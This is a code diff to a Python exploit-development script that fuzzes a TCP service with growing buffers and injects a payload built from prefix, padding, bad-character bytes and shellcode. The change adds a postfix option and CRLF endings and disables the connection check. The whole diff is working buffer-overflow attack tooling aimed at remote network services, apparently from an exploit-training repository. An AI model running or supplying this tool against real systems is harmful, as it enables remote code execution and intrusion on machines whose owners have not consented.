@@ -78,11 +78,12 @@ def test_connection(target_ip, target_port):
     k.close()
 
 
-def spike_fuzz_mode(target_ip, target_port, mode, prefix, prefill, step):
+def spike_fuzz_mode(target_ip, target_port, mode, prefix, prefill, step, postfix):
     # spike and fuzz modes
 
     # standard step size for fuzz
     package = b'A'*step
+    #package = 'A'*step
     timeout = 5
 
 
@@ -100,16 +101,15 @@ def spike_fuzz_mode(target_ip, target_port, mode, prefix, prefill, step):
                 
                 s.settimeout(timeout)
                 s.connect((target_ip, target_port))
-                s.recv(1024)
 
                 # send information as bytes
-                s.sendall(buffer)
-                s.recv(1024)
-                s.close()
+                #s.sendall(buffer + bytes("\n\r", "latin-1"))
+                s.send(buffer + bytes("\n\r", "latin-1"))
+                #s.send(bytes(buffer, "latin-1"))
 
                 sleep(1)
                 buffer = buffer + package * mult
-                print("Server alive. Payload size = %d" % (len(buffer) - len(prefix)))
+                print("Payload size sent = %d" % (len(buffer) - len(prefix)))
 
         except KeyboardInterrupt:
             print("Operation aborted. Exiting...")
@@ -120,7 +120,7 @@ def spike_fuzz_mode(target_ip, target_port, mode, prefix, prefill, step):
             sys.exit(1)
 
 
-def inject_mode(target_ip, target_port, BadChars, prefix, prefill, shellcode, useBadChars):
+def inject_mode(target_ip, target_port, BadChars, prefix, prefill, shellcode, useBadChars, postfix):
 
     timeout = 5
 
@@ -131,9 +131,11 @@ def inject_mode(target_ip, target_port, BadChars, prefix, prefill, shellcode, us
     s.settimeout(timeout)
     s.connect((target_ip, target_port))
 
-    s.sendall(prefix + prefill + BadChars + shellcode + b"\n")
+    payload = prefix + prefill + BadChars + shellcode + postfix
 
-    print(f"Injected into {target_ip}:{target_port}")
+    s.sendall(payload + bytes("\n\r", "latin-1"))
+
+    print(f"Injected {len(payload)} bytes to {target_ip}:{target_port}")
 
     s.close()
 
@@ -157,6 +159,8 @@ def main():
                         help='Step is amount of bytes to use in Fuzzying mode')
     parser.add_argument('-x', '--prefix', default='', type=str,
                         help='prefix can be used at the beginning of each TCP frame to make correct requests')
+    parser.add_argument('-p', '--postfix', default='', type=str,
+                        help='postfix is sometimes needed at the end of the payload: i.e. "\\r\\n"')
     parser.add_argument('-n', '--prefill_num', default=0, type=int,
                         help='Prefill the payload with n bytes after prefix')
     # Prefill with ascii pattern to find exact offset or insert non byte values
@@ -177,6 +181,7 @@ def main():
     target_port = args.targetPort
     step = args.step
     prefix = bytearray(args.prefix, encoding='ascii')
+    postfix = bytearray(args.postfix, encoding='ascii')
     prefill_num = args.prefill_num
     prefill_pattern = bytearray(args.prefill_pattern, encoding='ascii')
     useBadChars = args.useBadChars
@@ -186,14 +191,14 @@ def main():
 
     if mode == "spike" or mode == "fuzz":
 
-        test_connection(target_ip, target_port)
-        spike_fuzz_mode(target_ip, target_port, mode, prefix, prefill, step)
+        #test_connection(target_ip, target_port)
+        spike_fuzz_mode(target_ip, target_port, mode, prefix, prefill, step, postfix)
 
     elif mode == "inject":
 
-        test_connection(target_ip, target_port)
+        #test_connection(target_ip, target_port)
         inject_mode(target_ip, target_port, BadChars,
-                    prefix, prefill, shellcode, useBadChars)
+                    prefix, prefill, shellcode, useBadChars,postfix)
 
     else:
         print(f"Uknown mode: {mode} ... exiting")
